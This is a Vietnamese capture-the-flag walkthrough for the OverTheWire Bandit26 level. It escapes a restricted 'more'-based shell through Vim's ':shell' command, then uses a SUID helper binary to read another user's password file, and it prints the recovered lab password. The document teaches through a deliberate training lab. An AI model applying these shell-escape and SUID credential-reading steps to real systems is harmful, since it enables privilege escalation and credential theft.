### **Mục tiêu**

Đăng nhập vào Bandit26 và lấy mật khẩu cho Bandit27, vượt qua một shell không chuẩn (`non-standard shell`) và tận dụng tệp thực thi đặc quyền (`SUID binary`) để đọc được file chứa mật khẩu.

---

### **Cách tiếp cận**

Ở Bandit25, khi gõ `cat /etc/passwd` để kiểm tra shell của level thì tôi phát hiện Bandit26 không phải là `/bin/bash` hay `/bin/sh` thông thường, mà nó chạy `/usr/bin/showtext`.

```
bandit25@bandit:~$ cat /usr/bin/showtext 
#!/bin/sh 
export TERM=linux 
exec more ~/text.txt 
exit 0
```

-> Ta thấy hệ thống không tự động đưa vào shell tương tác thông thường mà lại tự động thực thi `more ~/text.txt` -> ta chỉ xem được `text.txt` rồi server sẽ đóng. 

Vì vậy ta cần xử lí các bước sau để thoát khỏi restricted shell này.

1. **Xử lý shell bị giới hạn**
    
    - Khi SSH vào tài khoản `bandit26`, shell mặc định không phải là `/bin/bash` nên các lệnh cơ bản như `ls`, `cat` không hoạt động.
    - Để thoát khỏi shell này, sử dụng **Vim** để mở một terminal phụ với `/bin/bash`:
        - Thu nhỏ cửa sổ console, gõ `v` để mở Vim.
        - Trong Vim, gõ:
            
            `:set shell=/bin/bash`
            
            rồi nhấn `Enter`.
        - Sau đó gõ:
            
            `:shell`
            
            để thoát ra một terminal chuẩn.
            
2. **Kiểm tra các file trong thư mục**
    
    - Dùng `ls -la` để xem có file nào đáng chú ý.
    - Phát hiện ra một file tên `bandit27-do` có quyền SUID:
        
        `-rwsr-x--- 1 bandit27 bandit26 14884 Aug 15 13:16 bandit27-do`
        
    - Quyền này cho phép chạy file với **quyền user `bandit27`**.
        
3. **Sử dụng `bandit27-do` để đọc mật khẩu**
    
    - Chạy file này kèm theo lệnh `cat /etc/bandit_pass/bandit27`:
        
        `./bandit27-do cat /etc/bandit_pass/bandit27`
        
    -> Vì file thực thi chạy với quyền `bandit27`, bạn có thể đọc được mật khẩu của level tiếp theo.

### **Các lệnh đã dùng**

```
# Kết nối SSH
ssh bandit26@bandit.labs.overthewire.org -p 2220

# Trong Vim
:set shell=/bin/bash
:shell

# Kiểm tra file và quyền
ls -la

# Chạy SUID binary để lấy mật khẩu
./bandit27-do cat /etc/bandit_pass/bandit27
```

### **Kết quả**

```
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```

Mật khẩu cho level tiếp theo là:

`upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB`

